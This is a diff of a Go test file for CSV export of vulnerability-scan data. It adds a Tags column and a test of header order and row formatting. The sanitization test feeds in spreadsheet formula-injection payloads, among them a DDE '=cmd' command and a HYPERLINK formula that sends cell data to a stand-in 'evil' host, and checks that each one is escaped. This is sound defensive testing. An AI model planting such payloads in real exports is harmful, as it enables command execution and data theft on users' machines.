@@ -15,8 +15,10 @@
 package export
 
 import (
+	"bytes"
 	"testing"
 
+	"github.com/gocarina/gocsv"
 	"github.com/stretchr/testify/assert"
 )
 
@@ -50,6 +52,7 @@ func TestDataSanitizeForCSV(t *testing.T) {
 	d := Data{
 		Repository:     "attacker/app",
 		ArtifactDigest: "sha256:deadbeef",
+		Tags:           "=malicious_tag,v1.0",
 		CVEId:          "CVE-2026-0001",
 		Package:        "@evil/pkg",
 		Version:        "=cmd|'/c calc'!A1",
@@ -60,6 +63,7 @@ func TestDataSanitizeForCSV(t *testing.T) {
 		ScannerName:    "Trivy",
 	}
 	d.sanitizeForCSV()
+	assert.Equal(t, "'=malicious_tag,v1.0", d.Tags)
 	assert.Equal(t, "'@evil/pkg", d.Package)
 	assert.Equal(t, "'=cmd|'/c calc'!A1", d.Version)
 	assert.Equal(t, "'+1+1", d.FixVersion)
@@ -67,6 +71,52 @@ func TestDataSanitizeForCSV(t *testing.T) {
 	assert.Equal(t, `'=HYPERLINK("http://evil/"&A1)`, d.AdditionalData)
 	// Benign fields are untouched.
 	assert.Equal(t, "attacker/app", d.Repository)
+	assert.Equal(t, "sha256:deadbeef", d.ArtifactDigest)
 	assert.Equal(t, "CVE-2026-0001", d.CVEId)
 	assert.Equal(t, "Trivy", d.ScannerName)
+}
+
+func TestCSVExportWithTags(t *testing.T) {
+	records := []Data{
+		{
+			Repository:     "library/ubuntu",
+			ArtifactDigest: "sha256:1111",
+			Tags:           "latest,v1.0.0",
+			CVEId:          "CVE-2026-1001",
+			Package:        "openssl",
+			Version:        "1.1.1",
+			FixVersion:     "1.1.2",
+			Severity:       "High",
+			CWEIds:         "CWE-123",
+			AdditionalData: "{}",
+			ScannerName:    "Trivy",
+		},
+		{
+			Repository:     "library/alpine",
+			ArtifactDigest: "sha256:2222",
+			Tags:           "",
+			CVEId:          "CVE-2026-1002",
+			Package:        "musl",
+			Version:        "1.2.0",
+			FixVersion:     "1.2.1",
+			Severity:       "Medium",
+			CWEIds:         "",
+			AdditionalData: "{}",
+			ScannerName:    "Trivy",
+		},
+	}
+
+	buf := &bytes.Buffer{}
+	err := gocsv.Marshal(records, buf)
+	assert.NoError(t, err)
+
+	csvOutput := buf.String()
+	expectedHeader := "Repository,Artifact Digest,Tags,CVE,Package,Current Version,Fixed in version,Severity,CWE Ids,Additional Data,Scanner\n"
+	assert.True(t, bytes.HasPrefix(buf.Bytes(), []byte(expectedHeader)), "Expected CSV header to contain Tags column in order: %s", csvOutput)
+
+	// Verify tagged artifact row
+	assert.Contains(t, csvOutput, "library/ubuntu,sha256:1111,\"latest,v1.0.0\",CVE-2026-1001,openssl,1.1.1,1.1.2,High,CWE-123,{},Trivy\n")
+
+	// Verify untagged artifact row (empty Tags column)
+	assert.Contains(t, csvOutput, "library/alpine,sha256:2222,,CVE-2026-1002,musl,1.2.0,1.2.1,Medium,,{},Trivy\n")
 }
